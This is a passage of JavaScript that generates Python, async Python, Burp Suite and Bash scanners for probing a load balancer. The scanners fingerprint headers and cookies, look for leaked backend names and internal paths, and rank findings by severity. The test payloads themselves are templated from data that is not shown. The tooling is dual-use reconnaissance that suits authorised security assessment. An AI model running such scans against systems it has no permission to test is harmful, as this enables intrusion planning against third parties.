                'response_time': round(time.time() - start_time, 3),
                'success': False
            })
            print(f"    {Colors.RED}üí•{Colors.END} Unexpected error: {str(e)}")
        
        self.results.append(result)
        return result

    def _get_status_emoji(self, status_code):
        """Get emoji for HTTP status code"""
        if status_code == 200:
            return "‚úÖ"
        elif status_code in [301, 302, 303, 307, 308]:
            return "üîÑ"
        elif status_code == 403:
            return "üö´"
        elif status_code == 404:
            return "‚ùì"
        elif status_code >= 500:
            return "üí•"
        else:
            return "‚ÑπÔ∏è"

    def _analyze_response(self, response, severity, test_name):
        """Comprehensive response analysis"""
        indicators = []
        
        # Load balancer identification headers
        lb_headers = {
            'Server': 'Server technology',
            'Via': 'Proxy/LB information',
            'X-Powered-By': 'Technology stack',
            'X-Load-Balancer': 'Load balancer ID',
            'X-Backend-Server': 'Backend server info',
            'X-Cache': 'Cache status',
            'X-Served-By': 'Serving node',
            'X-LB-ID': 'Load balancer identifier',
            'CF-RAY': 'CloudFlare ray ID',
            'X-Azure-FDID': 'Azure Front Door ID',
            'X-Amz-Cf-Id': 'CloudFront distribution',
            'X-Varnish': 'Varnish cache',
            'X-Fastly-Request-ID': 'Fastly CDN'
        }
        
        for header, description in lb_headers.items():
            if header in response.headers:
                value = response.headers[header]
                indicators.append(f"{description}: {value}")
                self.fingerprints.add(f"{header}={value}")
        
        # Security analysis based on status code and test
        if response.status_code == 200:
            if severity in ['critical', 'high']:
                indicators.append("‚ö†Ô∏è  HIGH RISK: 200 OK response to security test")
                if severity == 'critical':
                    self.vulnerabilities.append({
                        'test': test_name,
                        'severity': severity,
                        'status': response.status_code,
                        'risk': 'Critical vulnerability detected'
                    })
            
            if any(admin_term in response.url.lower() for admin_term in ['admin', 'manage', 'config']):
                indicators.append("üîê Admin interface potentially accessible")
        
        elif response.status_code == 403:
            indicators.append("üö´ Access forbidden (endpoint exists)")
        
        elif response.status_code in [500, 502, 503, 504]:
            indicators.append(f"üí• Server error {response.status_code} - possible DoS impact")
            if 'admin' in test_name.lower():
                indicators.append("üéØ Admin endpoint error - may indicate presence")
        
        elif response.status_code in [301, 302, 307, 308]:
            location = response.headers.get('Location', '')
            if location:
                indicators.append(f"üîÑ Redirect: {location}")
                if any(term in location.lower() for term in ['admin', 'login', 'auth']):
                    indicators.append("üéØ Redirected to authentication/admin area")
        
        # Content analysis
        if response.text:
            content_lower = response.text.lower()
            
            # Backend information leakage
            backend_patterns = [
                r'backend[\\s\\-_]*server[\\s\\-_]*([\\w\\.-]+)',
                r'server[\\s\\-_]*id[\\s\\-_]*([\\w\\.-]+)',
                r'node[\\s\\-_]*([\\w\\.-]+)',
                r'instance[\\s\\-_]*([\\w\\.-]+)'
            ]
            
            for pattern in backend_patterns:
                matches = re.findall(pattern, content_lower)
                for match in matches:
                    self.backends.add(match)
                    indicators.append(f"üñ•Ô∏è  Backend server: {match}")
            
            # Error information
            if 'error' in content_lower and len(response.text) > 200:
                indicators.append("‚ö†Ô∏è  Detailed error information exposed")
            
            # Internal paths/information
            internal_patterns = [
                r'/(?:etc|var|usr|opt)/[\\w/.-]+',
                r'[A-Za-z]:\\\\[\\w\\\\.-]+',
                r'(?:internal|private|admin)[\\w.-]*\\.[\\w.-]+',
                r'\\b(?:10|172|192)\\.\\d+\\.\\d+\\.\\d+\\b'
            ]
            
            for pattern in internal_patterns:
                if re.search(pattern, response.text):
                    indicators.append("üìÅ Internal path/IP information detected")
                    break
        
        # Cookie analysis
        if 'Set-Cookie' in response.headers:
            cookies = response.headers['Set-Cookie']
            
            # Backend routing cookies
            if any(term in cookies.lower() for term in ['serverid', 'backend', 'node', 'instance']):
                indicators.append(f"üç™ Backend routing cookie: {cookies[:100]}...")
            
            # Session cookies
            if any(term in cookies.lower() for term in ['session', 'jsession', 'phpsess']):
                indicators.append("üîë Session cookie set")
            
            # Security flags
            if 'secure' not in cookies.lower():
                indicators.append("‚ö†Ô∏è  Cookie missing Secure flag")
            if 'httponly' not in cookies.lower():
                indicators.append("‚ö†Ô∏è  Cookie missing HttpOnly flag")
        
        # Security headers analysis
        security_headers = {
            'Strict-Transport-Security': 'HSTS',
            'X-Frame-Options': 'Clickjacking protection',
            'X-Content-Type-Options': 'MIME sniffing protection',
            'Content-Security-Policy': 'CSP',
            'X-XSS-Protection': 'XSS protection'
        }
        
        missing_headers = []
        for header, description in security_headers.items():
            if header not in response.headers:
                missing_headers.append(description)
        
        if missing_headers:
            indicators.append(f"üõ°Ô∏è  Missing security headers: {', '.join(missing_headers[:3])}")
        
        return indicators

    def _extract_findings(self, response, test_name, severity):
        """Extract and categorize security findings"""
        
        # Check for specific vulnerability indicators
        if response.status_code == 200 and severity == 'critical':
            self.vulnerabilities.append({
                'test': test_name,
                'severity': severity,
                'status': response.status_code,
                'description': 'Critical test returned 200 OK'
            })
        
        # Extract server information for fingerprinting
        server_header = response.headers.get('Server', '')
        if server_header:
            self.fingerprints.add(f"Server: {server_header}")

    def run_all_tests(self):
        """Execute all security tests"""
        tests = [
${tests.map(({ category, test }) => {
    const headers = test.headers || {};
    const path = test.path || '/';
    const body = test.body || '';
    return `            ("${category}", "${test.name}", "${test.description}", "${test.method || 'GET'}", ${JSON.stringify(headers)}, "${path}", "${body}", "${test.severity}")`;
}).join(',\n')}
        ]
        
        self.print_banner()
        
        print(f"{Colors.CYAN}üöÄ Starting comprehensive security assessment...{Colors.END}")
        print(f"{Colors.CYAN}üìä Total tests to execute: {len(tests)}{Colors.END}")
        print("=" * 70)
        
        category_counts = defaultdict(int)
        for category, _, _, _, _, _, _, _ in tests:
            category_counts[category] += 1
        
        for i, (category, name, desc, method, headers, path, body, severity) in enumerate(tests, 1):
            if i == 1 or category != tests[i-2][0]:  # New category
                print(f"\\n{Colors.PURPLE}üìÇ {category} ({category_counts[category]} tests){Colors.END}")
                print("-" * 50)
            
            print(f"\\n[{i}/{len(tests)}]", end=" ")
            self.execute_test(category, name, desc, method, headers, path, 
                            body if body else None, severity)
            
            # Small delay between requests to be respectful
            time.sleep(0.1)
        
        return self.results

    def generate_comprehensive_report(self):
        """Generate detailed security assessment report"""
        total = len(self.results)
        successful = sum(1 for r in self.results if r.get('success', False))
        failed = total - successful
        
        # Categorize by severity
        severity_stats = defaultdict(lambda: {'total': 0, 'successful': 0, 'interesting': 0})
        category_stats = defaultdict(int)
        
        for result in self.results:
            sev = result['severity']
            cat = result['category']
            
            severity_stats[sev]['total'] += 1
            category_stats[cat] += 1
            
            if result.get('success', False):
                severity_stats[sev]['successful'] += 1
                
                # Flag interesting findings
                if (result.get('status_code') == 200 and sev in ['critical', 'high']) or \\
                   (result.get('indicators') and len(result['indicators']) > 2):
                    severity_stats[sev]['interesting'] += 1
        
        # Calculate timing statistics
        response_times = [r.get('response_time', 0) for r in self.results if r.get('response_time')]
        avg_time = sum(response_times) / len(response_times) if response_times else 0
        max_time = max(response_times) if response_times else 0
        min_time = min(response_times) if response_times else 0
        
        return {
            'target': self.target,
            'scan_time': datetime.now().isoformat(),
            'summary': {
                'total_tests': total,
                'successful_requests': successful,
                'failed_requests': failed,
                'success_rate': round((successful / total) * 100, 2),
                'avg_response_time': round(avg_time, 3),
                'max_response_time': round(max_time, 3),
                'min_response_time': round(min_time, 3)
            },
            'severity_breakdown': dict(severity_stats),
            'category_breakdown': dict(category_stats),
            'vulnerabilities': self.vulnerabilities,
            'fingerprints': list(self.fingerprints),
            'backend_servers': list(self.backends),
            'detailed_results': self.results
        }

    def print_executive_summary(self, report):
        """Print executive summary with enhanced formatting"""
        print("\\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.PURPLE}üõ°Ô∏è  LOAD BALANCER SECURITY ASSESSMENT REPORT{Colors.END}")
        print("=" * 70)
        
        # Target information
        print(f"{Colors.CYAN}üéØ Target Information:{Colors.END}")
        print(f"   URL: {report['target']}")
        print(f"   Host: {TARGET_HOST}")
        print(f"   Scan Time: {datetime.fromisoformat(report['scan_time']).strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Summary statistics
        summary = report['summary']
        print(f"\\n{Colors.CYAN}üìä Test Summary:{Colors.END}")
        print(f"   Total Tests: {summary['total_tests']}")
        print(f"   Successful: {Colors.GREEN}{summary['successful_requests']}{Colors.END}")
        print(f"   Failed: {Colors.RED}{summary['failed_requests']}{Colors.END}")
        print(f"   Success Rate: {Colors.YELLOW}{summary['success_rate']}%{Colors.END}")
        print(f"   Avg Response Time: {summary['avg_response_time']}s")
        
        # Severity breakdown
        print(f"\\n{Colors.CYAN}‚ö° Severity Analysis:{Colors.END}")
        severity_order = ['critical', 'high', 'medium', 'low']
        severity_colors = {
            'critical': Colors.RED,
            'high': Colors.YELLOW, 
            'medium': Colors.BLUE,
            'low': Colors.GREEN
        }
        
        for severity in severity_order:
            if severity in report['severity_breakdown']:
                stats = report['severity_breakdown'][severity]
                color = severity_colors[severity]
                emoji = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}[severity]
                print(f"   {emoji} {color}{severity.upper()}{Colors.END}: {stats['successful']}/{stats['total']} " +
                      f"successful ({stats['interesting']} interesting)")
        
        # Vulnerabilities
        if report['vulnerabilities']:
            print(f"\\n{Colors.RED}üö® CRITICAL FINDINGS ({len(report['vulnerabilities'])}):{Colors.END}")
            for vuln in report['vulnerabilities'][:5]:
                print(f"   ‚Ä¢ {Colors.RED}[{vuln['severity'].upper()}]{Colors.END} {vuln['test']}")
                if 'description' in vuln:
                    print(f"     {vuln['description']}")
        
        # Fingerprinting results
        if report['fingerprints']:
            print(f"\\n{Colors.BLUE}üîç LOAD BALANCER FINGERPRINTS ({len(report['fingerprints'])}):{Colors.END}")
            for fp in sorted(report['fingerprints'])[:5]:
                print(f"   ‚Ä¢ {fp}")
            if len(report['fingerprints']) > 5:
                print(f"   ... and {len(report['fingerprints']) - 5} more")
        
        # Backend servers
        if report['backend_servers']:
            print(f"\\n{Colors.GREEN}üñ•Ô∏è  BACKEND SERVERS DETECTED ({len(report['backend_servers'])}):{Colors.END}")
            for backend in sorted(report['backend_servers']):
                print(f"   ‚Ä¢ {backend}")
        
        # Top categories
        print(f"\\n{Colors.CYAN}üìà TOP TEST CATEGORIES:{Colors.END}")
        sorted_categories = sorted(report['category_breakdown'].items(), 
                                 key=lambda x: x[1], reverse=True)
        for category, count in sorted_categories[:5]:
            print(f"   ‚Ä¢ {category}: {count} tests")
        
        # Risk assessment
        print(f"\\n{Colors.PURPLE}üõ°Ô∏è  RISK ASSESSMENT:{Colors.END}")
        critical_count = len([v for v in report['vulnerabilities'] if v['severity'] == 'critical'])
        high_count = len([v for v in report['vulnerabilities'] if v['severity'] == 'high'])
        
        if critical_count > 0:
            print(f"   {Colors.RED}üî¥ HIGH RISK: {critical_count} critical vulnerabilities detected{Colors.END}")
        elif high_count > 0:
            print(f"   {Colors.YELLOW}üü† MEDIUM RISK: {high_count} high-severity issues detected{Colors.END}")
        else:
            print(f"   {Colors.GREEN}üü¢ LOW RISK: No critical vulnerabilities detected{Colors.END}")
        
        print("\\n" + "=" * 70)

def main():
    try:
        scanner = LoadBalancerSecurityScanner()
        
        # Execute scan
        results = scanner.run_all_tests()
        
        # Generate comprehensive report
        report = scanner.generate_comprehensive_report()
        scanner.print_executive_summary(report)
        
        # Save detailed report
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"lb_security_report_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"\\n{Colors.GREEN}üìÑ Detailed report saved: {filename}{Colors.END}")
        
        # Save executive summary
        summary_filename = f"lb_security_summary_{timestamp}.txt"
        with open(summary_filename, 'w') as f:
            # Redirect stdout to file temporarily
            import sys
            original_stdout = sys.stdout
            sys.stdout = f
            scanner.print_executive_summary(report)
            sys.stdout = original_stdout
        
        print(f"{Colors.GREEN}üìã Executive summary saved: {summary_filename}{Colors.END}")
        
        # Return appropriate exit code
        critical_count = len(report['vulnerabilities'])
        if critical_count > 0:
            print(f"\\n{Colors.RED}‚ö†Ô∏è  {critical_count} security issues detected!{Colors.END}")
            sys.exit(1)
        else:
            print(f"\\n{Colors.GREEN}‚úÖ Security scan completed successfully{Colors.END}")
            sys.exit(0)
            
    except KeyboardInterrupt:
        print(f"\\n{Colors.YELLOW}‚èπÔ∏è  Scan interrupted by user{Colors.END}")
        sys.exit(130)
    except Exception as e:
        print(f"\\n{Colors.RED}‚ùå Scanner error: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()
`;
        }

        // Generate Python async script with enhanced features
        function generatePythonAsyncScript(tests, targetUrl) {
            const url = new URL(targetUrl);
            const targetHost = url.hostname;
            
            return `#!/usr/bin/env python3
"""
‚ö° Advanced Async Load Balancer Security Scanner
üéØ Target: ${targetUrl}
üß™ Tests: ${tests.length}
üìÖ Generated: ${new Date().toISOString()}

High-performance concurrent security testing with real-time analysis
"""

import asyncio
import aiohttp
import json
import time
import sys
import re
from urllib.parse import urljoin
from datetime import datetime
from collections import defaultdict, Counter
import ssl

# Configuration
TARGET_URL = "${targetUrl}"
TARGET_HOST = "${targetHost}"
MAX_CONCURRENT = 25
TIMEOUT = 30
RETRY_DELAY = 1

class AsyncLoadBalancerScanner:
    def __init__(self, concurrency=MAX_CONCURRENT):
        self.target = TARGET_URL
        self.host = TARGET_HOST
        self.concurrency = concurrency
        self.semaphore = asyncio.Semaphore(concurrency)
        self.results = []
        self.fingerprints = set()
        self.vulnerabilities = []
        self.performance_metrics = []

    async def execute_test(self, session, category, test_name, description, 
                          method, headers, path, body=None, severity="medium"):
        """Execute async security test with comprehensive analysis"""
        async with self.semaphore:
            start_time = time.time()
            
            # Process headers
            processed_headers = {}
            if headers:
                for key, value in headers.items():
                    processed_headers[key] = value.replace('TARGET', self.host)
            
            url = urljoin(self.target, path or '/')
            
            result = {
                'category': category,
                'name': test_name,
                'description': description,
                'method': method,
                'severity': severity,
                'url': url,
                'timestamp': datetime.now().isoformat()
            }
            
            try:
                async with session.request(
                    method=method,
                    url=url,
                    headers=processed_headers,
                    data=body,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=TIMEOUT)
                ) as response:
                    
                    content = await response.read()
                    response_time = time.time() - start_time
                    
                    result.update({
                        'status_code': response.status,
                        'response_time': round(response_time, 3),
                        'response_size': len(content),
                        'response_headers': dict(response.headers),
                        'success': True
                    })
                    
                    # Performance tracking
                    self.performance_metrics.append({
                        'test': test_name,
                        'response_time': response_time,
                        'size': len(content),
                        'status': response.status
                    })
                    
                    # Quick security analysis
                    indicators = await self._analyze_response_async(response, content, severity, test_name)
                    result['indicators'] = indicators
                    
                    # Status emoji
                    emoji = self._get_status_emoji(response.status)
                    severity_color = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}
                    sev_emoji = severity_color.get(severity, '‚ö™')
                    
                    print(f"{emoji} {sev_emoji} {test_name[:50]:<50} | {response.status:3d} | {response_time:6.3f}s")
                    
                    # Show critical findings immediately
                    if response.status == 200 and severity == 'critical':
                        print(f"   üö® CRITICAL: {test_name} returned 200 OK!")
                        self.vulnerabilities.append({
                            'test': test_name,
                            'severity': severity,
                            'status': response.status,
                            'category': category
                        })
                    
            except asyncio.TimeoutError:
                result.update({
                    'error': 'Timeout',
                    'response_time': TIMEOUT,
                    'success': False
                })
                print(f"‚è±Ô∏è  ‚ö™ {test_name[:50]:<50} | TMO | {TIMEOUT:6.1f}s")
                
            except aiohttp.ClientError as e:
                result.update({
                    'error': str(e),
                    'response_time': round(time.time() - start_time, 3),
                    'success': False
                })
                print(f"‚ùå ‚ö™ {test_name[:50]:<50} | ERR | {str(e)[:20]}")
                
            except Exception as e:
                result.update({
                    'error': f"Unexpected: {str(e)}",
                    'response_time': round(time.time() - start_time, 3),
                    'success': False
                })
                print(f"üí• ‚ö™ {test_name[:50]:<50} | EXC | {str(e)[:20]}")
            
            return result

    def _get_status_emoji(self, status_code):
        """Get emoji for HTTP status code"""
        emoji_map = {
            200: "‚úÖ", 201: "‚úÖ", 202: "‚úÖ",
            301: "üîÑ", 302: "üîÑ", 303: "üîÑ", 307: "üîÑ", 308: "üîÑ",
            400: "‚ùì", 401: "üîê", 403: "üö´", 404: "‚ùì", 405: "‚ùì",
            500: "üí•", 502: "üí•", 503: "üí•", 504: "üí•"
        }
        return emoji_map.get(status_code, "‚ÑπÔ∏è")

    async def _analyze_response_async(self, response, content, severity, test_name):
        """Async response analysis for security indicators"""
        indicators = []
        
        # Header analysis
        lb_headers = ['Server', 'Via', 'X-Powered-By', 'X-Load-Balancer', 
                     'X-Backend-Server', 'X-Cache', 'CF-RAY', 'X-Azure-FDID']
        
        for header in lb_headers:
            if header in response.headers:
                value = response.headers[header]
                indicators.append(f"{header}: {value}")
                self.fingerprints.add(f"{header}={value}")
        
        # Content analysis for backend info
        if content:
            text = content.decode('utf-8', errors='ignore').lower()
            
            # Backend server patterns
            backend_patterns = [
                r'backend[\\s\\-_]*([\\w\\.-]+)',
                r'server[\\s\\-_]*id[\\s\\-_]*([\\w\\.-]+)'
            ]
            
            for pattern in backend_patterns:
                matches = re.findall(pattern, text)
                for match in matches[:2]:  # Limit to avoid spam
                    indicators.append(f"Backend: {match}")
        
        # Cookie analysis
        if 'Set-Cookie' in response.headers:
            cookie = response.headers['Set-Cookie']
            if any(term in cookie.lower() for term in ['serverid', 'backend']):
                indicators.append(f"Route cookie: {cookie[:50]}...")
        
        return indicators

    async def run_scan(self):
        """Run all tests concurrently with progress tracking"""
        tests = [
${tests.map(({ category, test }) => {
    const headers = test.headers || {};
    const path = test.path || '/';
    const body = test.body || '';
    return `            ("${category}", "${test.name}", "${test.description}", "${test.method || 'GET'}", ${JSON.stringify(headers)}, "${path}", "${body}", "${test.severity}")`;
}).join(',\n')}
        ]
        
        print(f"""
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                               ‚ïë
‚ïë  ‚ö° Advanced Async Load Balancer Security Scanner            ‚ïë
‚ïë                                                               ‚ïë
‚ïë  üéØ Target: {self.target:<46} ‚ïë
‚ïë  üß™ Tests:  {len(tests):<46} ‚ïë
‚ïë  üîÑ Concurrency: {self.concurrency:<39} ‚ïë
‚ïë  ‚è±Ô∏è  Timeout: {TIMEOUT}s{'':<43} ‚ïë
‚ïë                                                               ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
""")
        
        print(f"{'Status':<2} {'Sev':<3} {'Test Name':<50} | {'Code':<3} | {'Time'}")
        print("‚îÄ" * 80)
        
        # SSL context for bypassing certificate verification
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        connector = aiohttp.TCPConnector(
            verify_ssl=False,
            limit=self.concurrency,
            limit_per_host=self.concurrency,
            ssl=ssl_context
        )
        
        async with aiohttp.ClientSession(
            connector=connector,
            headers={'User-Agent': 'AsyncLB-SecurityScanner/3.0'}
        ) as session:
            
            tasks = [
                self.execute_test(session, *test_data)
                for test_data in tests
            ]
            
            # Run with progress tracking
            start_time = time.time()
            self.results = await asyncio.gather(*tasks, return_exceptions=False)
            total_time = time.time() - start_time
            
            print("‚îÄ" * 80)
            print(f"‚úÖ Scan completed in {total_time:.2f} seconds")
            
        return self.results

    def analyze_results(self):
        """Comprehensive results analysis"""
        total = len(self.results)
        successful = sum(1 for r in self.results if r.get('success', False))
        
        print(f"\\nüìä SCAN RESULTS SUMMARY:")
        print(f"   Total tests: {total}")
        print(f"   Successful: {successful}")
        print(f"   Failed: {total - successful}")
        print(f"   Success rate: {(successful/total)*100:.1f}%")
        
        # Performance analysis
        if self.performance_metrics:
            times = [m['response_time'] for m in self.performance_metrics]
            avg_time = sum(times) / len(times)
            max_time = max(times)
            min_time = min(times)
            
            print(f"\\n‚è±Ô∏è  PERFORMANCE METRICS:")
            print(f"   Average response time: {avg_time:.3f}s")
            print(f"   Fastest response: {min_time:.3f}s")
            print(f"   Slowest response: {max_time:.3f}s")
        
        # Status code analysis
        status_codes = Counter(r.get('status_code') for r in self.results if r.get('status_code'))
        if status_codes:
            print(f"\\nüìà STATUS CODE DISTRIBUTION:")
            for code in sorted(status_codes.keys()):
                count = status_codes[code]
                emoji = self._get_status_emoji(code)
                print(f"   {emoji} HTTP {code}: {count} responses")
        
        # Severity analysis
        severity_success = defaultdict(int)
        severity_total = defaultdict(int)
        
        for result in self.results:
            sev = result['severity']
            severity_total[sev] += 1
            if result.get('success'):
                severity_success[sev] += 1
        
        print(f"\\n‚ö° SEVERITY ANALYSIS:")
        severity_emojis = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}
        for sev in ['critical', 'high', 'medium', 'low']:
            if sev in severity_total:
                emoji = severity_emojis[sev]
                success_count = severity_success[sev]
                total_count = severity_total[sev]
                print(f"   {emoji} {sev.upper()}: {success_count}/{total_count} successful")
        
        # Critical findings
        if self.vulnerabilities:
            print(f"\\nüö® CRITICAL FINDINGS ({len(self.vulnerabilities)}):")
            for vuln in self.vulnerabilities[:5]:
                print(f"   ‚Ä¢ [{vuln['severity'].upper()}] {vuln['test']}")
        
        # Fingerprinting results
        if self.fingerprints:
            print(f"\\nüîç LOAD BALANCER FINGERPRINTS ({len(self.fingerprints)}):")
            for fp in sorted(self.fingerprints)[:5]:
                print(f"   ‚Ä¢ {fp}")
            if len(self.fingerprints) > 5:
                print(f"   ... and {len(self.fingerprints) - 5} more")
        
        # Top slow tests
        if self.performance_metrics:
            slow_tests = sorted(self.performance_metrics, 
                              key=lambda x: x['response_time'], reverse=True)[:3]
            print(f"\\nüêå SLOWEST TESTS:")
            for test in slow_tests:
                print(f"   ‚Ä¢ {test['test'][:40]}: {test['response_time']:.3f}s")

async def main():
    try:
        scanner = AsyncLoadBalancerScanner()
        
        # Run scan
        await scanner.run_scan()
        
        # Analyze results
        scanner.analyze_results()
        
        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"async_lb_scan_{timestamp}.json"
        
        report = {
            'target': TARGET_URL,
            'scan_duration': time.time(),
            'concurrency': scanner.concurrency,
            'vulnerabilities': scanner.vulnerabilities,
            'fingerprints': list(scanner.fingerprints),
            'performance_metrics': scanner.performance_metrics,
            'results': scanner.results
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"\\nüìÑ Results saved to {filename}")
        
        # Exit code based on findings
        if scanner.vulnerabilities:
            print(f"\\n‚ö†Ô∏è  {len(scanner.vulnerabilities)} critical security issues detected!")
            sys.exit(1)
        else:
            print(f"\\n‚úÖ Scan completed successfully")
            sys.exit(0)
        
    except KeyboardInterrupt:
        print("\\n‚èπÔ∏è  Scan interrupted")
        sys.exit(130)
    except Exception as e:
        print(f"\\n‚ùå Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())
`;
        }

        // Generate Burp Suite requests
        function generateBurpRequests(tests, targetUrl) {
            const url = new URL(targetUrl);
            const targetHost = url.hostname;
            
            let requests = `# Burp Suite Request Templates
# Load Balancer Security Testing Suite
# Target: ${targetUrl}
# Generated: ${new Date().toISOString()}
# Import into Burp Repeater, Intruder, or use with Turbo Intruder

`;

            tests.forEach(({ category, test }, index) => {
                requests += `# ${index + 1}. ${test.name} (${test.severity.toUpperCase()})
# Category: ${category}
# Description: ${test.description}
# Severity: ${test.severity}

${test.method || 'GET'} ${test.path || '/'} HTTP/1.1
Host: ${targetHost}`;

                if (test.headers) {
                    Object.entries(test.headers).forEach(([key, value]) => {
                        const headerValue = value.replace(/TARGET/g, targetHost);
                        requests += `\n${key}: ${headerValue}`;
                    });
                }

                requests += `
User-Agent: Burp-LoadBalancer-Tester/2.0
Accept: */*
Connection: close`;

                if (test.body) {
                    requests += `\nContent-Length: ${test.body.length}\n\n${test.body}`;
                } else {
                    requests += `\n\n`;
                }

                requests += `${'='.repeat(80)}\n\n`;
            });

            return requests;
        }

        // Generate Bash script
        function generateBashScript(tests, targetUrl, proxyUrl) {
            const url = new URL(targetUrl);
            const targetHost = url.hostname;
            
            let script = `#!/bin/bash
# Advanced Load Balancer Security Testing Script
# Target: ${targetUrl}
# Generated: ${new Date().toISOString()}

set -euo pipefail

# Configuration
TARGET_URL="${targetUrl}"
TARGET_HOST="${targetHost}"
${proxyUrl ? `PROXY="--proxy ${proxyUrl}"` : 'PROXY=""'}
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOGDIR="lb_scan_$TIMESTAMP"
RESULTS_FILE="$LOGDIR/results.json"

# Colors for output
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
PURPLE='\\033[0;35m'
CYAN='\\033[0;36m'
WHITE='\\033[1;37m'
NC='\\033[0m' # No Color

# Create results directory
mkdir -p "$LOGDIR"

# Initialize results file
echo '{"target":"'$TARGET_URL'","timestamp":"'$(date -Iseconds)'","tests":[]}' > "$RESULTS_FILE"

echo -e "${PURPLE}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${NC}"
echo -e "${PURPLE}‚ïë                                                               ‚ïë${NC}"
echo -e "${PURPLE}‚ïë     üõ°Ô∏è  Advanced Load Balancer Security Scanner             ‚ïë${NC}"
echo -e "${PURPLE}‚ïë                                                               ‚ïë${NC}"
echo -e "${PURPLE}‚ïë     üéØ Target: ${TARGET_URL}${NC}"
echo -e "${PURPLE}‚ïë     üìÖ Time:   $(date)${NC}"
echo -e "${PURPLE}‚ïë     üìÅ Output: $LOGDIR/${NC}"
echo -e "${PURPLE}‚ïë                                                               ‚ïë${NC}"
echo -e "${PURPLE}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${NC}"

echo ""
echo -e "${CYAN}üöÄ Starting security assessment...${NC}"
echo -e "${CYAN}üìä Total tests: ${tests.length}${NC}"
echo "=================================================="

# Function to log results
log_result() {
    local test_name="$1"
    local status_code="$2"
    local response_time="$3"
    local category="$4"
    local severity="$5"
    
    # Add to JSON results (simplified)
    echo "Test: $test_name | Status: $status_code | Time: $response_time | Category: $category | Severity: $severity" >> "$LOGDIR/summary.txt"
}

# Function to get status emoji
get_status_emoji() {
    case $1 in
        200) echo "‚úÖ" ;;
        401) echo "üîê" ;;
        403) echo "üö´" ;;
        404) echo "‚ùì" ;;
        500|502|503|504) echo "üí•" ;;
        *) echo "‚ÑπÔ∏è" ;;
    esac
}

# Function to get severity color
get_severity_color() {
    case $1 in
        critical) echo "$RED" ;;
        high) echo "$YELLOW" ;;
        medium) echo "$BLUE" ;;
        low) echo "$GREEN" ;;
        *) echo "$WHITE" ;;
    esac
}

`;

            tests.forEach(({ category, test }, index) => {
                const testNum = index + 1;
                script += `
# Test ${testNum}: ${test.name}
echo ""
echo -e "${CYAN}[${testNum}/${tests.length}] ${category}${NC}"
echo -e "$(get_severity_color ${test.severity})[${test.severity.toUpperCase()}]${NC} ${test.name}"
echo "Description: ${test.description}"

start_time=$(date +%s.%N)
response_file="$LOGDIR/test_${testNum}_response.txt"
headers_file="$LOGDIR/test_${testNum}_headers.txt"

curl -s -k $PROXY \\
  -X ${test.method || 'GET'} \\`;

                // Add headers
                if (test.headers) {
                    Object.entries(test.headers).forEach(([key, value]) => {
                        const headerValue = value.replace(/TARGET/g, targetHost).replace(/"/g, '\\"');
                        script += `\n  -H "${key}: ${headerValue}" \\`;
                    });
                }

                // Add body if present
                if (test.body) {
